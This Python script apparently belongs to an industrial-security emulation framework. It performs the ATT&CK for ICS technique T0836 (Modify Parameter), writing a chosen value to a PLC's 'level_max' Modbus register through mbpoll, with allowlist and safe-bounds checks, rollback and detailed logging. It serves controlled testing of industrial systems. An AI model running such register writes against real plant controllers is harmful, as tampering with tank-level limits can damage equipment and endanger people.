#!/usr/bin/env python3
from __future__ import annotations

import sys
import time
from pathlib import Path

from app_core.infrastructure.attack.industrial_ops import (
    artifact_ref,
    attacker_context_from_argv,
    build_causal_edges,
    build_recoverability_report,
    build_uncertainty_report,
    clone_runtime_artifacts,
    collect_state,
    emit_json_banner,
    ensure_validated_context,
    mbpoll_write,
    output_dir_from_argv,
    policy_write_target,
    validated_address,
    load_params,
    utc_now,
    write_json,
)
from app_core.infrastructure.attack.industrial_resolver import derive_scenario_id


ATTACK_ID = "T0836_MODIFY_PARAMETER"
MITRE_ID = "T0836"
OBSERVED_VARIABLES = [
    "level",
    "level_max",
    "openOutletValve",
    "outletValveOpenStatus",
    "openInletValve",
    "inletValveOpenStatus",
    "airValveOpenStatus",
]


def main(argv: list[str]) -> int:
    params = load_params(argv)
    output_dir = output_dir_from_argv(argv)
    attacker = attacker_context_from_argv(argv)
    context = ensure_validated_context(output_dir, require_validation=True)
    clone_runtime_artifacts(output_dir)
    scenario_id = derive_scenario_id()
    target_ip = context["register_map"]["plc"].get("ip") or argv[1] or "unknown"
    write_target = policy_write_target(context, "level_max")
    validated = validated_address(context, "level_max")

    print("===========================================")
    print("ATT&CK PROFILE: T0836 - Modify Parameter")
    print(f"TARGET: {target_ip}")
    print("TARGET PARAMETER: level_max")
    print("MODE: CONTROLLED WRITE WITH ROLLBACK")
    print("===========================================")

    if not write_target or not validated:
        print("[FAIL] No validated allowlist target for level_max")
        return 2

    safe_min = int(write_target.get("safe_min", 10))
    safe_max = int(write_target.get("safe_max", 90))
    attack_value = int(params.get("value", write_target.get("default_attack_value", 30)))
    if attack_value < safe_min or attack_value > safe_max:
        print(f"[FAIL] Requested value {attack_value} is outside safe bounds [{safe_min}, {safe_max}]")
        return 2

    slave_id = 1
    if context.get("scada_map", {}).get("modbus_devices"):
        slave_id = int(context["scada_map"]["modbus_devices"][0].get("slaveid") or 1)
    modbus_address = int(validated["validated_modbus_address"])
    plc = context["register_map"]["plc"]

    before = collect_state(context, OBSERVED_VARIABLES, source_ip=attacker["source_ip"], source_user=attacker["source_user"])
    original = before["variables"].get("level_max", {}).get("value")
    if original is None:
        print("[FAIL] Could not read original level_max value")
        return 2

    write_result = mbpoll_write(
        target_ip,
        slave_id,
        write_target.get("modbus_table", "holding_register"),
        modbus_address,
        attack_value,
        source_ip=attacker["source_ip"],
        source_user=attacker["source_user"],
    )
    if not write_result.get("ok"):
        print("[FAIL] Modbus write did not succeed")
        return 2

    time.sleep(2)
    after = collect_state(context, OBSERVED_VARIABLES, source_ip=attacker["source_ip"], source_user=attacker["source_user"])
    after_value = after["variables"].get("level_max", {}).get("value")
    rollback = mbpoll_write(
        target_ip,
        slave_id,
        write_target.get("modbus_table", "holding_register"),
        modbus_address,
        int(original),
        source_ip=attacker["source_ip"],
        source_user=attacker["source_user"],
    )
    time.sleep(2)
    restored = collect_state(context, OBSERVED_VARIABLES, source_ip=attacker["source_ip"], source_user=attacker["source_user"])
    restored_value = restored["variables"].get("level_max", {}).get("value")
    rollback_ok = rollback.get("ok", False)
    restored_ok = restored_value == original

    transaction_log = {
        "attack_id": ATTACK_ID,
        "mitre_id": MITRE_ID,
        "scenario_id": scenario_id,
        "run_id": Path(output_dir).name,
        "target_ip": target_ip,
        "target_role": "industrial_plc",
        "source_ip": attacker["source_ip"],
        "tool_used": "mbpoll",
        "generated_at_utc": utc_now(),
        "parameters": {
            "validated_modbus_address": modbus_address,
            "write_target": "level_max",
            "requested_value": attack_value,
            "safe_min": safe_min,
            "safe_max": safe_max,
        },
        "result": {
            "before_value": original,
            "after_value": after_value,
            "restored_value": restored_value,
            "rollback_ok": rollback_ok,
            "restored_state_verified": restored_ok,
        },
        "write_command": write_result,
        "rollback_command": rollback,
    }
    rollback_log = {
        "attack_id": ATTACK_ID,
        "mitre_id": MITRE_ID,
        "scenario_id": scenario_id,
        "run_id": Path(output_dir).name,
        "target_ip": target_ip,
        "target_role": "industrial_plc",
        "source_ip": attacker["source_ip"],
        "generated_at_utc": utc_now(),
        "rollback_executed": rollback_ok,
        "restored_state_verified": restored_ok,
        "original_value": original,
        "restored_value": restored_value,
    }
    causal = build_causal_edges(
        attack_id=ATTACK_ID,
        mitre_id=MITRE_ID,
        scenario_id=scenario_id,
        source_ip=attacker["source_ip"],
        target_ip=target_ip,
        target_role="industrial_plc",
        write_target="level_max",
    )
    uncertainty = build_uncertainty_report(
        attack_id=ATTACK_ID,
        mitre_id=MITRE_ID,
        scenario_id=scenario_id,
        notes=[
            {"canonical_name": "level_max", "status": "confirmed" if after_value == attack_value else "unresolved", "reason": "write_post_read_verification"},
            {"canonical_name": "rollback", "status": "confirmed" if rollback_ok and restored_ok else "unresolved", "reason": "restored_state_check"},
        ],
    )
    recoverability = build_recoverability_report(
        attack_id=ATTACK_ID,
        scenario_id=scenario_id,
        rollback_ok=rollback_ok,
        restored_ok=restored_ok,
    )

    files = {
        "plc_state_before.json": before,
        "plc_state_after.json": after,
        "plc_state_restored.json": restored,
        "modbus_transaction_log.json": transaction_log,
        "rollback_log.json": rollback_log,
        "causal_edges.json": causal,
        "causal_path_recoverability.json": recoverability,
        "uncertainty_report.json": uncertainty,
    }
    for name, payload in files.items():
        write_json(output_dir / name, payload)

    summary = {
        "attack_id": ATTACK_ID,
        "target_ip": target_ip,
        "before_value": original,
        "after_value": after_value,
        "restored_value": restored_value,
        "rollback_ok": rollback_ok,
        "restored_ok": restored_ok,
        "artifacts": [artifact_ref(output_dir / name, output_dir) for name in files],
    }
    emit_json_banner(summary)
    if not rollback_ok or not restored_ok:
        print("[CRITICAL] Rollback failed or restored state verification failed")
        return 3
    if after_value != attack_value:
        print("[FAIL] Post-write verification failed")
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
